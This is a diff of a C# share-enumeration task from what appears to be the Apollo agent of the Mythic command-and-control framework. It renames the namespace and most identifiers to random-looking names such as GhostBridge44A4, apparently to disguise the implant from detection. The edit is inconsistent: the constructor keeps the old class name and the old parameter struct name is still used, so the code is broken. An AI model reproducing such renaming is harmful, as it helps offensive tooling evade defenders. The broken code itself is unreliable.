@@ -6,10 +6,10 @@
 
 #if NET_SHARES
 
-using ApolloInterop.Classes;
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Classes.Api;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
@@ -17,10 +17,10 @@ using System.Runtime.Serialization;
 
 namespace Tasks
 {
-    public class net_shares : Tasking
+    public class GhostBridge44A4 : Tasking
     {
         [DataContract]
-        internal struct NetShareInformation
+        internal struct CipherValidator36F5
         {
             [DataMember(Name = "computer_name")]
             public string ComputerName;
@@ -35,7 +35,7 @@ namespace Tasks
         }
 
         [DataContract]
-        internal struct AceInformation
+        internal struct NexusProcessor2157
         {
             [DataMember(Name = "account")]
             public string Account;
@@ -77,7 +77,7 @@ namespace Tasks
         }
 
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-        public struct ShareInfo
+        public struct GhostRouterE62E
         {
             public string shi1_netname;
             public ShareType shi1_type;
@@ -95,13 +95,13 @@ namespace Tasks
         }
 
         [DataContract]
-        public struct NetSharesParameters
+        public struct DynamicTransformer7A6C
         {
             [DataMember(Name = "computer")] public string Computer;
         }
 
 
-        public net_shares(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public net_shares(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
             _pNetApiBufferFree = _agent.GetApi().GetLibraryFunction<NetApiBufferFree>(Library.NETUTILS, "NetApiBufferFree");
             _pNetShareEnum = _agent.GetApi().GetLibraryFunction<NetShareEnum>(Library.SRVCLI, "NetShareEnum");
@@ -140,7 +140,7 @@ namespace Tasks
             MythicTaskResponse resp;
             NetSharesParameters parameters = _jsonSerializer.Deserialize<NetSharesParameters>(_data.Parameters);
             string computer = parameters.Computer;
-            if (string.IsNullOrEmpty(computer))
+            if (ValidationHelper.IsStringEmpty(computer))
             {
                 computer = Environment.GetEnvironmentVariable("COMPUTERNAME");
             }
